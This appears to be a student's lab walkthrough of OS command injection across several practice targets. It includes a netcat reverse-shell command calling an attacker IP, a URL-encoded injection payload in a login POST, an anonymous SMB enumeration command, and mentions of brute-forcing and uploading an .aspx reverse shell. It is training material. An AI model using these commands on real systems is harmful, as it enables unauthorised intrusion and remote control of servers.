#### OS Command Injection
;

Semicolons can be used in a number of command lines, such as P$ or bash.

Some websites accept OS commands but sanitize the command.
 ; or && or & could be utilized to add a 2nd command to circumvent this security control.

Exercise:

Initial nmap scan of the target revealed the following open ports:
port 22
port 80

Navigating to the IP and port 80 in a Chromium web browser reveals that a web page is being hosted by the server.


The web page allows for a POST request including the system command 'git'.

The POST request can be poisoned by including the following two elements:
1. The & symbol, allowing for multiple lines of code input
2. A valid OS code

First, let's try two commands to enumerate the server's OS:

1. uname -a
2. ver

The web server responds with the Linux kernel version.



OS command injection is possible on the server! Now we can attempt to obtain a reverse shell.

Sending this command to the server creates a reverse shell on port 4444:

nc -nv 10.10.14.30 4444 -e /bin/sh

The command must be encoded before sending via POST.



...

Linux Reverse Shell Exercise 2

The IP address of the target is 192.168.205.16

Initial enumeration scan resulted in the discovery of a web app operating through port 80.
The app accepts a GET request and returns a page with a link to a login form.
The login form accepts POST with 3 data variables.



Upon multiple incorrent submissions, the string did not change.
VULN 1 The authentication can be brute-forced.

Sending a malformed POST request results in an error page from the debugger:



The debugger reveals that this is a Python application.
The debugger allows an interactive python shell if a correct pin is provided.

The FFA form output can be crashed with "

Interesting debugger lines:
if request.form['username'] != 'N@NdkWzmN@NdkWzmN@NdkWzm' or request.form['password'] != 'N@NdkWzmN@NdkWzmN@NdkWz!!!!!!###!!!!!m':

out = os.popen(f'echo "{ffa}"').read()
The popen() function executes the command specified by the string command, and creates a pointer.

In python interpreter, the method os.popen() executes a python method command, but crashes.
out = os.popen(time.sleep(10)).read()

Even better, a system command can be executed:
out = os.popen("dir").read()

This works:

POST /login
...
username=gooogie&password=gk&ffa=%22%7Bd%7D%26ls%22

The payload is formed like so: 
"{d}&ls"

Exercise #4

nmap scan reveals netbios, directory services, and http on ports 80 and 8000.
http port 80 is a microsoft IIS page.
http port 8000 is a web page with a file upload form that boasts its security:


Attempting a login or account registration results in the following server error:


Port 445 is open. We can try to enumerate an SMB share.

smbclient -U '%' -N \\\\<IP>\\<SHARE> 

But first, let's keep tring for OS Command Injection.


Bypass file extension filter.
OR
Write reverse shell in C# and save as .aspx









